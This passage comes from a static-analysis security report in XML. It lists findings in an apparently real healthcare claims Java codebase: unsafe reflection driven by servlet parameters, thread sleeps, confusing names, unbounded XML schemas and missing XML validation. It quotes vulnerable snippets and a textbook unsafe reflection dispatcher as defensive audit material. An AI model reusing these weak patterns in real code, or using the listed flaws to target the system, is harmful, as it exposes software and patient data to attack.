                            <Primary>
<FileName>CalculateRegVolumeNewImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/business/impl/CalculateRegVolumeNewImpl.java</FilePath>
<LineStart>46</LineStart>
<Snippet>	public void getCalculatedVolume(ProviderRegistrationResult prvdrRegResult, EHRUserDetails ehrUsrDtls) throws CNSIException {
		try {
			Thread.sleep(10000);
			calculateVolumeThreshold(prvdrRegResult, ehrUsrDtls);
		} catch (Exception ex) {</Snippet>
<TargetFunction>sleep()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="56002B4DC259AC12F30A1A0DCE58C2E6" ruleID="8ECE1D9E-AE40-4AD1-9ECB-6D024DBF8FCA">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method run() in CNSIRequestProcessMonitor.java calls sleep()  on line 100. Thread management in a web application is forbidden in some circumstances and is always highly error prone.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIRequestProcessMonitor.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/monitor/CNSIRequestProcessMonitor.java</FilePath>
<LineStart>100</LineStart>
<Snippet>    public void run() {
        try {
            Thread.sleep(SLEEP_TIME);
        } catch (InterruptedException l_objEx) {
            m_objLogger.log(Logger.SEVERITY_ERROR, getClass(), "Process Monitor Run Method",</Snippet>
<TargetFunction>sleep()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Poor Style: Confusing Naming</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The class CNSIDataDictionary$CLM_ERROR_EDIT_LOGIC contains a field and a method both named CLM_ERROR_EDIT_LOGIC, which is confusing.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>It is confusing to have a member field and a method with the same name. It makes it easy for a programmer to accidentally call the method when attempting to access the field or vice versa.

Example 1:


public class Totaller {
  private int total;
  public int total() {
    ...
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Rename either the method or the field. If the method returns the field, consider following the standard getter/setter naming convention.

Example 2: The code in Example 1 could be rewritten in the following way:


public class Totaller {
  private int total;
  public int getTotal() {
    ...
  }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>6</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E089DFB977B3EB3BB6EF72CB36BFC692" ruleID="FE7263A8-4A1C-4048-9F53-5B892AC7533A">
                            <Category>Poor Style: Confusing Naming</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The class CNSIDataDictionary$CLM_ERROR_EDIT_LOGIC contains a field and a method both named CLM_ERROR_EDIT_LOGIC, which is confusing.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIDataDictionary.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIDataDictionary.java</FilePath>
<LineStart>7700</LineStart>
<Snippet>	public static final String IMPLEMENTED_BY = "IMPLEMENTED_BY";
	public static final String IMPLEMENTED_DATE = "IMPLEMENTED_DATE";
	public static final String CLM_ERROR_EDIT_LOGIC = "CLM_ERROR_EDIT_LOGIC";
	public static final String CLM_ERROR_EDIT_DESC =   "CLM_ERROR_EDIT_DESC";
	public static final String RSLTN_TXT =   "RSLTN_TXT";</Snippet>
<TargetFunction>Field: CLM_ERROR_EDIT_LOGIC()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0D1277A7FA37B21A810DE0F41697CA1E" ruleID="FE7263A8-4A1C-4048-9F53-5B892AC7533A">
                            <Category>Poor Style: Confusing Naming</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The class CNSIDataDictionary$AD_CLM_LN_PHRMCY_DTL contains a field and a method both named AD_CLM_LN_PHRMCY_DTL, which is confusing.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIDataDictionary.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIDataDictionary.java</FilePath>
<LineStart>22367</LineStart>
<Snippet>	{
	    public static final String TABLE_NAME = "AD_CLM_LN_PHRMCY_DTL";
		public static final String AD_CLM_LN_PHRMCY_DTL= "AD_LN_HDR_PHRMCY_DTL";
		public static final String PRESCRIBER_ID = "PRESCRIBER_ID";
		public static final String PA_SUBMITTED = "PA_SUBMITTED";</Snippet>
<TargetFunction>Field: AD_CLM_LN_PHRMCY_DTL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DBF538E36DED0D2BF18C47328D2C97DA" ruleID="FE7263A8-4A1C-4048-9F53-5B892AC7533A">
                            <Category>Poor Style: Confusing Naming</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The class CNSIDataDictionary$GROSS_ADJSTMNT_CD_X_TRTMNT_TYP contains a field and a method both named GROSS_ADJSTMNT_CD_X_TRTMNT_TYP, which is confusing.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIDataDictionary.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIDataDictionary.java</FilePath>
<LineStart>23269</LineStart>
<Snippet>		public static final String TABLE_NAME = "GROSS_ADJSTMNT_CD_X_TRTMNT_TYP";
		public static final String SEQUENCE_NAME = "GROSS_ADJSTMNT_CD_X_TRTMNT_SEQ";
		public static final String GROSS_ADJSTMNT_CD_X_TRTMNT_TYP = "GROSS_ADJSTMNT_CD_X_TRTMNT_TYP";
		public static final String TRTMNT_TYPE_CODE = "TRTMNT_TYPE_CODE";
		public static final String GROSS_ADJSTMNT_CODE = "GROSS_ADJSTMNT_CODE";</Snippet>
<TargetFunction>Field: GROSS_ADJSTMNT_CD_X_TRTMNT_TYP()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5A2921B6DC7AB4940FD931E51EDC9B01" ruleID="FE7263A8-4A1C-4048-9F53-5B892AC7533A">
                            <Category>Poor Style: Confusing Naming</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The class CNSIDataDictionary$BATCH_FILE_DATA contains a field and a method both named BATCH_FILE_DATA, which is confusing.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIDataDictionary.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIDataDictionary.java</FilePath>
<LineStart>22404</LineStart>
<Snippet>	    public static final String BATCH_FILE_DATA_SID = "BATCH_FILE_DATA_SID";
	    public static final String UPLOAD_BATCH_FILE_INSTANCE_SID = "UPLOAD_BATCH_FILE_INSTANCE_SID";
	    public static final String BATCH_FILE_DATA = "BATCH_FILE_DATA";
	    public static final String CONV_FILE_DATA = "CONV_FILE_DATA";
	    public static final String OPRTNL_FLAG = "OPRTNL_FLAG";</Snippet>
<TargetFunction>Field: BATCH_FILE_DATA()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E4EC90C3C88C744514BFAD847287FF73" ruleID="FE7263A8-4A1C-4048-9F53-5B892AC7533A">
                            <Category>Poor Style: Confusing Naming</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The class CNSIDataDictionary$AD_CLM_HDR_PHRMCY_DTL contains a field and a method both named AD_CLM_HDR_PHRMCY_DTL, which is confusing.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIDataDictionary.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIDataDictionary.java</FilePath>
<LineStart>22328</LineStart>
<Snippet>	{
	    public static final String TABLE_NAME = "AD_CLM_HDR_PHRMCY_DTL";
		public static final String AD_CLM_HDR_PHRMCY_DTL= "AD_CLM_HDR_PHRMCY_DTL";
		public static final String RX_CLAIM_NMBR = "RX_CLAIM_NMBR";
		public static final String TIME_CLAIM_ADDED = "TIME_CLAIM_ADDED";</Snippet>
<TargetFunction>Field: AD_CLM_HDR_PHRMCY_DTL()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Unsafe Reflection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Attackers are able to control an argument to the reflection method invoke() at EJBResourceFactory.java line 199, which could allow them to create unexpected control flow paths through the application, potentially bypassing security checks.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>If an attacker can supply values that the application then uses to determine which class to instantiate or which method to invoke, the potential exists for the attacker to create control flow paths through the application that were not intended by the application developers. This attack vector may allow the attacker to bypass authentication or access control checks or otherwise cause the application to behave in an unexpected manner. Even the ability to control the arguments passed to a given method or constructor may give a wily attacker the edge necessary to mount a successful attack.

This situation becomes a doomsday scenario if the attacker may upload files into a location that appears on the application's classpath or add new entries to the application's classpath. Under either of these conditions, the attacker may use reflection to introduce new, presumably malicious, behavior into the application.

Example: A common reason that programmers use the reflection API is to implement their own command dispatcher. The following example shows a command dispatcher that does not use reflection:


String ctl = request.getParameter("ctl");
Worker ao = null;
if (ctl.equals("Add")) {
  ao = new AddCommand();
} else if (ctl.equals("Modify")) {
  ao = new ModifyCommand();
} else {
  throw new UnknownActionError();
}
ao.doAction(request);


A programmer might refactor this code to use reflection as follows:


    String ctl = request.getParameter("ctl");
    Class cmdClass = Class.forName(ctl + "Command");
    Worker ao = (Worker) cmdClass.newInstance();
    ao.doAction(request);


The refactoring initially appears to offer a number of advantages. There are fewer lines of code, the if/else blocks have been entirely eliminated, and it is now possible to add new command types without modifying the command dispatcher.

However, the refactoring allows an attacker to instantiate any object that implements the Worker interface. If the command dispatcher is still responsible for access control, then whenever programmers create a new class that implements the Worker interface, they must remember to modify the dispatcher's access control code. If they fail to modify the access control code, then some Worker classes will not have any access control.

One way to address this access control problem is to make the Worker object responsible for performing the access control check. An example of the re-refactored code is as follows:


String ctl = request.getParameter("ctl");
Class cmdClass = Class.forName(ctl + "Command");
Worker ao = (Worker) cmdClass.newInstance();
ao.checkAccessControl(request);
ao.doAction(request);


Although this is an improvement, it encourages a decentralized approach to access control, which makes it easier for programmers to make access control mistakes.

This code also highlights another security problem with using reflection to build a command dispatcher. An attacker may invoke the default constructor for any kind of object. In fact, the attacker is not even constrained to objects that implement the Worker interface; the default constructor for any object in the system can be invoked. If the object does not implement the Worker interface, a ClassCastException will be thrown before the assignment to ao, but if the constructor performs operations that work in the attacker's favor, the damage will have already been done. Although this scenario is relatively benign in simple applications, in larger applications where complexity grows exponentially it is not unreasonable to assume that an attacker could find a constructor to leverage as part of an attack.

Access checks may also be compromised further down the code execution chain, if certain Java APIs that perform tasks using the immediate caller's class loader check, are invoked on untrusted objects returned by reflection calls. These Java APIs bypass the SecurityManager check that ensures all callers in the execution chain have the requisite security permissions. Care should be taken to ensure these APIs are not invoked on the untrusted objects returned by reflection as they can bypass security access checks and leave the system vulnerable to remote attacks. For more information on these Java APIs please refer to Guideline 9 of The Secure Coding Guidelines for the Java Programming Language.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>The best way to prevent unsafe reflection is with a level of indirection: create a list of legitimate names that users are allowed to specify, and only allow users to select from the list. With this approach, input provided by users is never used directly to specify a name that is passed to the reflection API.

Reflection can also be used to create a custom data-driven architecture, whereby a configuration file determines the types and combinations of objects that are used by the application. This style of programming introduces the following security concerns:

- The configuration file that controls the program is an essential part of the program's source code and must be protected and reviewed accordingly.

- Because the configuration file is unique to the application, unique work must be performed to evaluate the security of the design.

- Because the semantics of the application are now governed by a configuration file with a custom format, custom rules are required for obtaining optimal static analysis results.

For these reasons, avoid using this style of design unless your team can devote a large amount of effort to security evaluation.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Beware of attempts to validate user input before using it as part of a call to a reflection method. Because the application is likely to evolve faster than the operating system, the file system, or other system components, the work required to validate user input must evolve much more rapidly than the input validation required for sending user data to other system components. Even if the validation is currently correct, it might not be correct in the future.

2. A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>6</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="0A4B08CEE347DE1739213C8BA7F518C2" ruleID="E1B32227-C0BD-4A57-9C34-6794D9089A21">
                            <Category>Unsafe Reflection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Attackers are able to control an argument to the reflection method getMethod() at ControlServlet.java line 227, which could allow them to create unexpected control flow paths through the application, potentially bypassing security checks.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/base/ControlServlet.java</FilePath>
<LineStart>227</LineStart>
<Snippet>
            Class l_objConfigClass = Class.forName(l_sConfigClassName);
            Method l_objMethod = l_objConfigClass.getMethod(l_sConfigMethod,
                    new Class []{new String().getClass()});
</Snippet>
<TargetFunction>java.lang.Class.getMethod()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/base/ControlServlet.java</FilePath>
<LineStart>219</LineStart>
<Snippet>	        // Code ends for reading/exploding properties jar -- Niraj
            String l_sConfigClassName = p_objConfig.getInitParameter(CONFIG_CLASS_PARAM);
            String l_sConfigMethod = p_objConfig.getInitParameter(INIT_METHOD_PARAM);
            String l_sConfigurationXML = p_objConfig.getInitParameter(CONFIG_FILE_PARAM);
            l_sConfigurationXML = replaceDynamicTokens(l_sConfigurationXML);</Snippet>
<TargetFunction>javax.servlet.ServletConfig.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F3E9F94E34843A32F20A78CB2CEEE195" ruleID="A691ED57-4101-480F-BBEA-91340A1A94FC">
                            <Category>Unsafe Reflection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Attackers are able to control an argument to the reflection method invoke() at ControlServlet.java line 230, which could allow them to create unexpected control flow paths through the application, potentially bypassing security checks.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/base/ControlServlet.java</FilePath>
<LineStart>230</LineStart>
<Snippet>                    new Class []{new String().getClass()});

            l_objMethod.invoke(null, new Object []{l_sConfigurationXML});

        }</Snippet>
<TargetFunction>java.lang.reflect.Method.invoke()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/base/ControlServlet.java</FilePath>
<LineStart>220</LineStart>
<Snippet>            String l_sConfigClassName = p_objConfig.getInitParameter(CONFIG_CLASS_PARAM);
            String l_sConfigMethod = p_objConfig.getInitParameter(INIT_METHOD_PARAM);
            String l_sConfigurationXML = p_objConfig.getInitParameter(CONFIG_FILE_PARAM);
            l_sConfigurationXML = replaceDynamicTokens(l_sConfigurationXML);
            </Snippet>
<TargetFunction>javax.servlet.ServletConfig.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0F3EC26212BF9D6AF559BCED01EFC52A" ruleID="A691ED57-4101-480F-BBEA-91340A1A94FC">
                            <Category>Unsafe Reflection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Attackers are able to control an argument to the reflection method invoke() at EJBResourceFactory.java line 199, which could allow them to create unexpected control flow paths through the application, potentially bypassing security checks.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EJBResourceFactory.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/ejb/EJBResourceFactory.java</FilePath>
<LineStart>199</LineStart>
<Snippet>            Class b_objClass = l_ejbHome.getClass();
            Method b_objMethod = b_objClass.getMethod("create", null);
            l_ejbObject = (EJBObject) b_objMethod.invoke(l_ejbHome, null);
        }
        catch(Exception ex)</Snippet>
<TargetFunction>java.lang.reflect.Method.invoke()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EJBResourceFactory.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/ejb/EJBResourceFactory.java</FilePath>
<LineStart>158</LineStart>
<Snippet>        {
            l_objContext = getAppServerContext();
            l_objEJBHome = (EJBHome) l_objContext.lookup(p_sJNDIName);
            l_objHandle = l_objEJBHome.getHomeHandle();
            m_objResourceFactory.m_mapHomeHandles.put(p_sJNDIName,</Snippet>
<TargetFunction>javax.naming.Context.lookup()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8680E64D1DB6775A473138C3FE273F7B" ruleID="A691ED57-4101-480F-BBEA-91340A1A94FC">
                            <Category>Unsafe Reflection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Attackers are able to control an argument to the reflection method invoke() at DaoHelper.java line 222, which could allow them to create unexpected control flow paths through the application, potentially bypassing security checks.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DaoHelper.java</FileName>
<FilePath>ECAMS-JAR/src/com/ecams/webservices/util/DaoHelper.java</FilePath>
<LineStart>222</LineStart>
<Snippet>		try {
			if (l_method != null) {
				l_method.invoke(p_objItem, l_objVal);
			}//if
		}//try</Snippet>
<TargetFunction>java.lang.reflect.Method.invoke()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DaoHelper.java</FileName>
<FilePath>ECAMS-JAR/src/com/ecams/webservices/util/DaoHelper.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			}
			// Execute Query
			l_resultSet = l_psStmt.executeQuery();

			if (m_objLog.isDebugEnabled()) {</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="971CC38E3C6E49AD8E9FBC08AD878A79" ruleID="E1B32227-C0BD-4A57-9C34-6794D9089A21">
                            <Category>Unsafe Reflection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Attackers are able to control an argument to the reflection method forName() at ControlServlet.java line 226, which could allow them to create unexpected control flow paths through the application, potentially bypassing security checks.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/base/ControlServlet.java</FilePath>
<LineStart>226</LineStart>
<Snippet>            CommonConstants.IS_UNIX_OS = isOperatingSystemUnix();

            Class l_objConfigClass = Class.forName(l_sConfigClassName);
            Method l_objMethod = l_objConfigClass.getMethod(l_sConfigMethod,
                    new Class []{new String().getClass()});</Snippet>
<TargetFunction>java.lang.Class.forName()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/base/ControlServlet.java</FilePath>
<LineStart>218</LineStart>
<Snippet>            
	        // Code ends for reading/exploding properties jar -- Niraj
            String l_sConfigClassName = p_objConfig.getInitParameter(CONFIG_CLASS_PARAM);
            String l_sConfigMethod = p_objConfig.getInitParameter(INIT_METHOD_PARAM);
            String l_sConfigurationXML = p_objConfig.getInitParameter(CONFIG_FILE_PARAM);</Snippet>
<TargetFunction>javax.servlet.ServletConfig.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Weak XML Schema: Unbounded Occurrences</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Setting a maxOccurs value to unbounded can lead to resources exhaustion and ultimately a denial of service.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Processing XML documents can be computationally expensive. Attackers may take advantage of schemas that allow unbounded elements by supplying an application with a very large number elements causing the application to exhaust system resources.

The following is an example of a schema that allows unbounded bar elements.

&lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" &gt;
  &lt;xs:element name="foo" &gt;
    &lt;xs:complexType&gt;
      &lt;xs:sequence&gt;
	&lt;xs:element name="bar" maxOccurs="unbounded" /&gt;
      &lt;/xs:sequence&gt;
    &lt;/xs:complexType&gt;
  &lt;/xs:element&gt;
&lt;/xs:schema&gt;
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Limit maxOccurs to a reasonable number.

The following is an example of a schema that allows 50 bar elements.

&lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" &gt;
  &lt;xs:element name="foo" &gt;
    &lt;xs:complexType&gt;
      &lt;xs:sequence&gt;
	&lt;xs:element name="bar" maxOccurs="50" /&gt;
      &lt;/xs:sequence&gt;
    &lt;/xs:complexType&gt;
  &lt;/xs:element&gt;
&lt;/xs:schema&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>5</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="4AA9F1E5AFEC23106D1008945F8BA716" ruleID="F7135003-B1E9-4B90-A0F0-6D1B233C021E">
                            <Category>Weak XML Schema: Unbounded Occurrences</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Setting a maxOccurs value to unbounded can lead to resources exhaustion and ultimately a denial of service.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ehr-hosp-formulas-1.0.xsd</FileName>
<FilePath>XML/ehr-hosp-formulas-1.0.xsd</FilePath>
<LineStart>41</LineStart>
<Snippet>    &lt;xsd:complexType&gt;
      &lt;xsd:sequence&gt;
        &lt;xsd:element maxOccurs="unbounded" ref="property"/&gt;
      &lt;/xsd:sequence&gt;
      &lt;xsd:attribute name="name" use="required" type="xsd:NCName"/&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="23D71D9FD48BF242FCA931B8466E2448" ruleID="F7135003-B1E9-4B90-A0F0-6D1B233C021E">
                            <Category>Weak XML Schema: Unbounded Occurrences</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Setting a maxOccurs value to unbounded can lead to resources exhaustion and ultimately a denial of service.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ehr-tooltip-1.0.xsd</FileName>
<FilePath>XML/ehr-tooltip-1.0.xsd</FilePath>
<LineStart>42</LineStart>
<Snippet>    &lt;xsd:complexType&gt;
      &lt;xsd:sequence&gt;
        &lt;xsd:element maxOccurs="unbounded" ref="property"/&gt;
      &lt;/xsd:sequence&gt;
      &lt;xsd:attribute name="name" use="required" type="xsd:NCName"/&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4AA9F1E5AFEC23106D1008945F8BA715" ruleID="F7135003-B1E9-4B90-A0F0-6D1B233C021E">
                            <Category>Weak XML Schema: Unbounded Occurrences</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Setting a maxOccurs value to unbounded can lead to resources exhaustion and ultimately a denial of service.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ehr-hosp-formulas-1.0.xsd</FileName>
<FilePath>XML/ehr-hosp-formulas-1.0.xsd</FilePath>
<LineStart>22</LineStart>
<Snippet>    &lt;xsd:complexType&gt;
      &lt;xsd:sequence&gt;
        &lt;xsd:element maxOccurs="unbounded" ref="formulavalue"/&gt;
      &lt;/xsd:sequence&gt;
    &lt;/xsd:complexType&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="23D71D9FD48BF242FCA931B8466E2446" ruleID="F7135003-B1E9-4B90-A0F0-6D1B233C021E">
                            <Category>Weak XML Schema: Unbounded Occurrences</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Setting a maxOccurs value to unbounded can lead to resources exhaustion and ultimately a denial of service.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ehr-tooltip-1.0.xsd</FileName>
<FilePath>XML/ehr-tooltip-1.0.xsd</FilePath>
<LineStart>23</LineStart>
<Snippet>    &lt;xsd:complexType&gt;
      &lt;xsd:sequence&gt;
        &lt;xsd:element maxOccurs="unbounded" ref="tooltipvalue"/&gt;
      &lt;/xsd:sequence&gt;
    &lt;/xsd:complexType&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="23D71D9FD48BF242FCA931B8466E2447" ruleID="F7135003-B1E9-4B90-A0F0-6D1B233C021E">
                            <Category>Weak XML Schema: Unbounded Occurrences</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Setting a maxOccurs value to unbounded can lead to resources exhaustion and ultimately a denial of service.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ehr-tooltip-1.0.xsd</FileName>
<FilePath>XML/ehr-tooltip-1.0.xsd</FilePath>
<LineStart>35</LineStart>
<Snippet>    &lt;xsd:complexType&gt;
      &lt;xsd:sequence&gt;
        &lt;xsd:element maxOccurs="unbounded" ref="page"/&gt;
      &lt;/xsd:sequence&gt;
    &lt;/xsd:complexType&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Missing XML Validation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method getDOMFromXMLFile() in XMLUtil.java fails to enable validation before parsing XML on line 130, which gives an attacker the opportunity to supply malicious input.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input. It is not possible for an XML parser to validate all aspects of a document's content; a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed.
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Always enable validation when you create an XML parser or parser factory. If enabling validation causes problems because the rules for defining a well-formed document are Byzantine or altogether unknown, chances are good that there are security errors nearby.

The following examples demonstrate how to enable validation for the Xerces parsers (both DOM and SAX):


org.apache.xerces.framework.XMLParser: parser.setValidation(true);
org.apache.xerces.framework.XMLParser: parser.setValidationSchema(true);


The following examples demonstrate how to enable validation for the SAX and DOM parser factories in the javax library.

javax SAX parser factory:


javax.xml.parsers.SAXParserFactory: factory.setValidating(true);
javax.xml.parsers.SAXParserFactory: factory.setFeature("http://xml.org/sax/features/validation", true);


javax DOM parser factory:


javax.xml.parsers.DocumentBuilderFactory: factory.setValidating(true);


The following examples demonstrate how to enable validation for individual parsers and XMLReaders in the javax library.

Note: The Fortify Software Security Research group does not recommend enabling validation by this method. Instead, you should enable validation at the parser factory.

javax SAX parser and reader:


javax.xml.parsers.SAXParser: parser.setProperty("http://xml.org/sax/features/validation", new Boolean(true));
org.xml.sax.XMLReader: reader.setFeature("http://xml.org/sax/features/validation", true);


The following examples demonstrate how to set the XML return type for Apache Axis.

Axis client Call:


call.addParameter("testParam", org.apache.axis.Constants.XSD_STRING, javax.xml.rpc.ParameterMode.IN);
call.setReturnType(org.apache.axis.Constants.XSD_STRING);
String ret = (String) call.invoke( new Object[] { "Hello!" } );
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. The Fortify Secure Coding Rulepacks checks to ensure that javax parser factories enable validation before they are used to create parsers. By ensuring that the parser factory always creates validating parsers, there is less opportunity for error when creating and using a parser.</Value>
